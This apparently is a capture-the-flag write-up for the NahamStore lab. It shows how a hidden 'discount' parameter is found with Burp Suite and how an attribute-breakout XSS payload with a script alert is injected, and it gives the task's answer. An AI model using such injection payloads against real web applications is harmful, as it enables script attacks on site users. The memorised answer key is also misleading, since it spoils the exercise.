<h1 align=center>Cross site scripting attack/XSS</h1>

# TASK 8
## What other hidden parameter can be found on the shop which can introduce an XSS vulnerability

#### to be honest i spend 1+ hour for this question. don't try manually. use burp suite instead of it.

first click on the products from "sticker pack" and "hoodie", then type discount coupon code and hit "add to basket" button, remember use burp to capture this request

## Request

```
POST /product?id=2 HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://nahamstore.thm
Connection: close
Referer: http://nahamstore.thm/product?id=2
Cookie: session=9604154dd85ab285184436dd6ebc37cd
Upgrade-Insecure-Requests: 1

add_to_basket=1&discount=12
```


### notice on the http request start line and body
```
id=2
add_to_basket=1
discount=12
```


### then i'm trying to execute xss using those parameter. but not interesting. so i changed the request method.

``` 
GET /product?id=2&add_to_basket=1&discount=12 HTTP/1.1
Host: nahamstore.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://nahamstore.thm
Connection: close
Referer: http://nahamstore.thm/product?id=2
Cookie: session=9604154dd85ab285184436dd6ebc37cd
Upgrade-Insecure-Requests: 1 
```

### and it also refleted back on the page 
``` 
 <form method="post">
       <input type="hidden" name="add_to_basket" value="1">
       <div style="margin-bottom:10px"><input placeholder="Discount Code" class="form-control" name="discount" value="12"></div>
       <input type="submit" class="btn btn-success" value="Add To basket">
       <input type="button" class="btn btn-info checkstock" data-product-id="1" value="Check Stock">
 </form>
 ```

### notice on the ```"name="discount" value="12">"```

### if i inject like this => "<script>alert("hacked by nazu")";// inside discount parameter guess what will happened?

### first it will close the value parameter using double quote(") then the code will execute.

# look 

value="12"
value=""<script>alert("hacked by nazu")";" | boom! 

```answer = discount```
